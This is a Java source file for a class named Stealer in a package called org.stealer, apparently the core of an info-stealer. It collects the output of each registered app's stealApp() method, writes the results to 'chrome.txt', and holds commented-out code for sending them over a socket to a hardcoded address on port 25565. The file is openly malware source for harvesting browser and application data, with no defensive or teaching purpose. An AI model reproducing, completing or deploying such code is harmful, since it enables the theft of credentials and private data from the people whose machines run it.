package org.stealer;

import java.io.BufferedWriter;
import java.io.DataOutputStream;
import java.io.FileWriter;
import java.net.Socket;

import org.stealer.app.App;
import org.stealer.app.AppManager;

public class Stealer {

	public static final String IP_ADDRESS = "127.0.0.1";
	public static final int PORT = 25565;
	
	private AppManager appManager = null;
	
	private Socket socket = null;
	private DataOutputStream out = null;
	
	public Stealer() {
		appManager = new AppManager();
	}
	
	public void init() {
		try {
			String message = "";
			
			//socket = new Socket(IP_ADDRESS, PORT);
			//out = new DataOutputStream(socket.getOutputStream());
			
			// remove
			BufferedWriter writer = new BufferedWriter(new FileWriter("chrome.txt"));
			appManager.init();
			for(App app : appManager.getApps()) {
				message += (app.stealApp() + System.getProperty("line.separator"));
			}
			
			writer.write(message);
			writer.flush();
		} catch(Exception e) {
			e.printStackTrace();
		} finally {
			try {
				// socket.close();
				// out.close();
			} catch(Exception e) {
				e.printStackTrace();
			}
		}
	}
}
